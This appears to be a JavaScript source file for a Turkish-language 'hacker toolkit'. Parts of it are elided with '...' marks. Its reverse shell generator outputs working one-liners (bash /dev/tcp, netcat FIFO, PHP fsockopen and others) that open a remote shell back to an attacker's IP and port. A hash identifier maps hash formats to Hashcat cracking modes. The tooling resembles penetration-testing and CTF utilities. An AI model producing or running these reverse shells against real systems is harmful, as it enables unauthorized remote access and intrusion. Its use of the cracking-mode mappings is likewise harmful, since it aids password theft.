/**
 * BZT Cyber Security - Hacker Toolkit & Automation
 * Reverse Shell Generator, Hash Identifier, and Cyber Encoders
 */

const BZTTools = {
  // 1. REVERSE SHELL GENERATOR
  generateShells(ip, port) {
    const lhost = ip || "10.10.14.5";
    const lport = port || "4444";

    return [
      {
        name: "Bash TCP (-i)",
        desc: "En yaygın ve hızlı Linux ters bağlantı kabuğu.",
        code: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`
      },
      {
        name: "Netcat OpenBSD (FIFO)",
        desc: "-e parametresi bulunmayan modern Linux/Netcat sürümleri için.",
        code: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${lhost} ${lport} >/tmp/f`
      },
      {
        name: "Python 3 PTY Shell",
        desc: "İnteraktif TTY/PTY kabuk açan Python3 ters bağlantısı.",
      ...
      },
      {
        ...
        desc: "Windows sistemler için tek satırlık TCP istemcisi.",
      ...
      {
        name: "PHP One-Liner",
        desc: "Web sitelerine dosya yükleme sonrası anında tetikleme.",
        code: `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`
      },
      {
        name: "Socat TTY (Full Interactive)",
        desc: "Tab tamamlama ve Ctrl+C yakalama destekli tam interaktif kabuk.",
  ...
  identifyHash(hashStr) {
    ...
    if (len === 32 && isHex) {
      return { type: "MD5 veya NTLM", confidence: "Yüksek", sampleMode: "Hashcat: -m 0 (MD5) veya -m 1000 (NTLM)" };
      ...
      return { type: "SHA-512 Unix Crypt", confidence: "Kesin", sampleMode: "Hashcat: -m 1800" };
    } else if (clean.startsWith("$argon2")) {
      return { type: "Argon2", confidence: "Kesin", sampleMode: "Hashcat: -m 29700" };
    } else {
      return { type: "Bilinmeyen veya Özel Hash", confidence: "Düşük", sampleMode: "Karakter uzunluğunu veya tuz (salt) yapısını kontrol edin." };
    }
  },

  // Browser-native SHA-256 calculation
